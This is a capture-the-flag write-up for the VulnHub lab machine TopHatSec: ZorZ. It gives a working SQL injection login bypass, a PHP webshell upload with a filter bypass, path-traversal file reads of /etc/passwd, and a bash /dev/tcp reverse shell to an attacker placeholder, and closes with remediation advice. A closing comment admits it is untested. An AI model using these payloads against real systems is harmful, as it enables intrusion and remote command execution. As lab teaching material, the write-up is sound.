# TopHatSec: ZorZ — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.X (host-only) |
| **Difficulty** | Easy–Medium |
| **OS** | Linux |
| **Root Flag** | Multiple challenge flags |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/tophatsec-zorz,117/) |

## Attack Summary

nmap → 3 web challenges (SQLi → file upload bypass → LFI) → webshell → shell access → flags

## Methodology

1. Network discovery and port scan
2. Challenge 1: SQL injection login bypass
3. Challenge 2: File upload filter bypass (PHP webshell)
4. Challenge 3: Local File Inclusion (LFI)
5. Shell and flag collection

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Open ports: 22 (SSH), 80 (HTTP — 3 web challenges at different paths).

---

## Step 2: Challenge 1 — SQL Injection Login Bypass

Navigate to `http://<TARGET>/` — a login form.

Test for SQL injection:

```bash
# Payload in username field:
' OR '1'='1
# Or:
admin'--
```

Standard SQLi bypass grants access. Flag 1 is displayed after login.

---

## Step 3: Challenge 2 — File Upload Filter Bypass

Navigate to the upload challenge (e.g., `http://<TARGET>/uploader/`).

The page allows file uploads but restricts by MIME type or extension.

Create a PHP webshell with a double extension or modified Content-Type:

```bash
# Create payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

Intercept with Burp Suite and change `Content-Type` to `image/jpeg` while keeping the `.php` extension, or use `.php5`/`.phtml` if the server allows it.

Upload and trigger:

```
http://<TARGET>/uploader/uploads/shell.php?cmd=id
```

Flag 2 is accessible via the webshell.

---

## Step 4: Challenge 3 — Local File Inclusion (LFI)

Navigate to `http://<TARGET>/c/` — a page with a file parameter.

Test for LFI:

```bash
curl "http://<TARGET>/c/?file=../../../etc/passwd"
# If filtered, try:
curl "http://<TARGET>/c/?file=....//....//....//etc/passwd"
```

Read the flag file:

```bash
curl "http://<TARGET>/c/?file=../../../var/www/html/flag3.txt"
```

---

## Step 5: Collect Flags

Each challenge reveals a flag. Use the webshell from Challenge 2 for a full interactive shell:

```bash
# Set up listener
nc -lvnp 4444

# Trigger reverse shell via webshell
curl "http://<TARGET>/uploader/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER>/4444+0>%261'"
```

---

## Lessons Learned

1. **SQLi login bypass** — always use parameterized queries, never string concatenation
2. **File upload validation** — check both extension and real MIME type (use `finfo`); never trust client-supplied Content-Type
3. **LFI via path traversal** — sanitize file parameters with `realpath()` and restrict to allowed directories
4. **Defense in depth** — multiple independent vulnerabilities should each be mitigated independently

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| SQL injection | Use prepared statements with bound parameters |
| Unrestricted file upload | Whitelist extensions; store uploads outside webroot; use `finfo_file()` |
| Local File Inclusion | Sanitize path with `realpath()`; whitelist allowed files |

<!-- generated from known techniques; verify against live VM -->
